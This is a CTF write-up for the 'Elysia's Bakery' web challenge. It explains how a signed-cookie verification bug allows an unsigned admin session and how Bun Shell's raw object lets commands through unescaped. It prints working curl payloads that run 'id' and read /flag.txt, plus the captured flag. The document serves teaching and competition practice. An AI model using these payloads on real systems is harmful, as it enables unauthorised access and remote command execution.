---
title: "[Web] Elysia's Bakery"
description: Writeup for "Elysia's Bakery" from BITS CTF 2026.
date: 2026-02-22 01:00:00 +0900
categories: [CTF, BITS CTF 2026]
tags: [Web]
toc: true
comments: false
---

# Elysia's Bakery (BITS CTF 2026)

---

- **Name:** Elysia's Bakery
- **Category:** Web
- **Description:** Becoming admin shouldn't be too hard?
- **Difficulty:** ★☆☆☆☆

---

## TL;DR

Two bugs chained together:

1. **Auth Bypass** — A bug in Elysia's signed cookie handling lets us send `Cookie: session=admin` without a valid signature and still get admin access.
2. **RCE via Bun Shell `raw` object** — `/admin/list` runs `ls ${folder}` internally. Passing `{"raw":"..."}` instead of a string string skips escaping and injects shell commands.

Final payload:
- `folder={"raw":">/dev/null && cat /flag.txt"}`
- Executes as: `ls >/dev/null && cat /flag.txt` → flag returned in response.

---

## Overview

The challenge description says **"Becoming admin shouldn't be too hard?"** — a direct hint that admin access is easier than expected.

The intended flow:
1. Bypass authentication → get admin session
2. Abuse the admin-only feature
3. Execute commands → read the flag

---

## Solution

### 1) Recon

`/admin/list` is an admin-only endpoint that takes a `folder` value and returns a file listing.

Two weak points to investigate:
- **Session / cookie authentication**
- **Whether the folder value is passed to a shell command**

Both turned out to be vulnerable.

---

### 2) Root Cause

#### 2-1) Auth Bypass: Signed Cookie Verification Bug

The server uses a signed `session` cookie to identify users.
Normally, sending `session=admin` without a valid signature should be rejected.

However, a bug in this version of Elysia (related to the `cookie.secrets` array + `cookie.sign` config) causes the server to **trust the cookie value even when signature verification fails**.

Result: `Cookie: session=admin` (no signature) is accepted as a valid admin session.

✅ The "signed cookie" effectively behaves like an **unsigned cookie**.

---

#### 2-2) RCE: Bun Shell `raw` Object Injection

The admin endpoint runs:

```ts
const result = $`ls ${folder}`.quiet();
```

Bun Shell's template literals **escape** `${}` values by default, so a normal string won't inject commands.

But Bun Shell supports a special `{"raw": "..."}` object — when used, the value is inserted **without any escaping**.

So passing `{"raw": ">/dev/null && cat /flag.txt"}` turns the command into:
```
ls >/dev/null && cat /flag.txt
```

---

#### 2-3) Filter Bypass: Type Check Gap

The server's input validation looks roughly like:

```ts
if (typeof folder === "string" && folder.includes("..")) {
  // block
}
```

Since the check only runs when `folder` is a **string**, passing an **object** skips the filter entirely.

Combined with the `raw` object trick, this gives us:
- ✅ Filter bypassed (not a string)
- ✅ Escaping bypassed (`raw` object)
- ✅ Shell command executed

---

### 3) Exploit

#### Step 1. Verify admin access

```bash
curl -s -X POST 'http://chals.bitskrieg.in:32274/admin/list' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=admin' \
  --data '{"folder":"."}'
```

If the response is a 200 with a file listing, auth bypass works.

#### Step 2. Test RCE

```bash
curl -s -X POST 'http://chals.bitskrieg.in:32274/admin/list' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=admin' \
  --data '{"folder":{"raw":">/dev/null && id"}}'
```

If `id` output appears in the response, RCE is confirmed.

#### Step 3. Read the flag

```bash
curl -s -X POST 'http://chals.bitskrieg.in:32274/admin/list' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=admin' \
  --data '{"folder":{"raw":">/dev/null && cat /flag.txt"}}'
```

Response:
```json
{"files":["BITSCTF{..}"]}
```

---

### 4) Why it works

| Step | Reason |
|---|---|
| `session=admin` is accepted | Elysia bug causes signature check failure to be silently ignored |
| `{"raw":"..."}` injects commands | Bun Shell skips escaping for `raw` objects |
| Filter is bypassed | Validation only checks string-type input; objects pass through unchecked |

---

## Solver

```bash
# One-shot: auth bypass + RCE + flag
curl -s -X POST 'http://chals.bitskrieg.in:32274/admin/list' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=admin' \
  --data '{"folder":{"raw":">/dev/null && cat /flag.txt"}}' \
| grep -o 'BITSCTF{[^}]*}'
```

---

## Exploit Chain

```text
[Attacker]
    |
    | 1) Cookie: session=admin  (no signature)
    v
[Server] -- signed cookie bug --> [Admin access granted]
    |
    | 2) POST /admin/list  {"folder": {"raw": ">/dev/null && cat /flag.txt"}}
    v
[Bun Shell] -- raw object skips escaping --> ls >/dev/null && cat /flag.txt
    |
    v
[Response contains flag]
```

---

## Flag

```
BITSCTF{dc10bd7ec1d0dacaf5ca3022aa80b058}
```
